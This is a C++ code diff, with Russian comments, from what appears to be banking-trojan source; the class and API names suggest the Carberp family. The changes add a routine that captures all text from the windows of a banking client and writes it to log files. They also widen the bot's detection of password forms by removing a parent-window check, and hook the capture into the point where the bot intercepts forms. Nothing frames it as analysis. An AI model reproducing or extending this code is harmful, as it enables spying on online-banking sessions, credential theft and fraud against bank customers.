@@ -203,6 +203,26 @@ namespace BSSSign
 			if (ScreenWnd)
 				MakeWndScreenShot(ScreenWnd);
 		}
+		//------------------------------------------------------------------
+
+		void AddTextFile(const char* LogLine, const char* Data, DWORD DataLen)
+		{
+			// Функция добавляет в лог текстовый файл
+			if (!DataLen)
+				DataLen = STRA::Length(Data);
+			if (!DataLen) return;
+
+			// Содаём имя файла
+			FScreensCount++;
+			string Name;
+			Name.Format("TextLog%d.txt", FScreensCount);
+			string FileName = FWorkPath + Name;
+
+			File::WriteBufferA(FileName.t_str(), (LPVOID)Data, DataLen);
+			Name.Format("---> <TextLog%d> [%s]", FScreensCount, LogLine);
+			Write(NULL, false, Name.t_str());
+        }
+
 
 		//------------------------------------------------------------------
 		void Close()
@@ -481,7 +501,7 @@ public:
 	bool static IsPasswordForm(TBSSClicker* Clicker, HWND WND, const string& Text)
 	{
 		// Этап первый: Окно должно быть диалогом, не иметь родителя.
-		if (((TBotCollection*)Clicker)->Count() == 0 || pGetParent(WND) != NULL)
+		if (((TBotCollection*)Clicker)->Count() == 0)
 			return false;
 
 		// Этап второй: проверяем вхождение слова пароль
@@ -605,6 +625,17 @@ public:
 	}
 	//------------------------------------------------------------------------
 
+	bool IsDialog(HWND Wnd)
+	{
+		// Функция возвращает истину если окно является диалоговым окном
+
+		HWND Owner = (HWND)pGetWindow(Wnd, GW_OWNER);
+
+		// Наличие окна владельца предполагает, что окно является диалоговым
+        return Owner != NULL;
+	}
+
+	//------------------------------------------------------------------------
     // Добавляем форму для клика
 	bool AddForm(HWND WND)
 	{
@@ -631,10 +662,26 @@ public:
 		if (TBSSErrorForm::IsErrorForm(this, ClassHash, TextHash))
 			Form = new TBSSErrorForm(this, WND);
 
+		// Логируем информацию об окне
+		#ifdef LOG_BSS_SIGN
+			if (Logger && !Text.IsEmpty() && IsDialog(WND))
+			{
+				// Получаем надписи всех окон
+				PCHAR WndText = GetAllWindowsText(WND, true, true);
+				if (WndText)
+				{
+					Logger->Write(NULL, false, "Отображается окно: ");
+                    Logger->AddTextFile(Text.t_str(), WndText, 0);
+					STR::Free(WndText);
+                }
+			}
+		#endif
+
 
 		if (!Form) return false;
 
         BSSSIGNLOG(NULL, false, "Обрабатываем форму [%s]", Text.t_str());
+
 
 		// Запускаем поток
 		TLock L = GetLocker();
